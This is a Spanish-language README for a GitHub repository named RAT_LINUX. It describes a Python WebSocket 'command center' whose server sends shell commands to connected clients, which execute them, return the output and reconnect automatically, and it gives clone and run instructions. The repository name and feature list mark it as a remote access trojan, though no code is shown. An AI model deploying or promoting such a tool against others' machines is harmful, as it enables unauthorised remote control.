# Centro de Comando WebSocket

## Descripción General

Este proyecto es un Centro de Comando WebSocket basado en Python que permite la comunicación en tiempo real entre un servidor y múltiples clientes. Utiliza `asyncio`, `websockets`, `subprocess` y `fastapi` para crear un entorno robusto e interactivo de ejecución de comandos a través de WebSockets.

## Características

- **Arquitectura de Servidor y Cliente**: Implementa tanto el servidor como el cliente WebSocket usando Python.
- **Ejecución de Comandos**: Ejecuta comandos recibidos vía WebSocket y devuelve la salida.
- **Reconexión Automática**: El cliente intentará reconectarse en caso de pérdida de conexión.
- **Soporte CLI**: CLI interactivo para enviar comandos a los clientes conectados.

## Instalación

Para comenzar con este proyecto, clona este repositorio e instala los paquetes de Python requeridos:

```bash
git clone https://github.com/RamNetSec/RAT_LINUX
cd RAT_LINUX
pip install -r requirements.txt
```


## Uso

### Servidor

Ejecuta el servidor con el siguiente comando:

```bash
python server.py
```

### Cliente

Conecta un cliente al servidor:

```bash
python client.py
```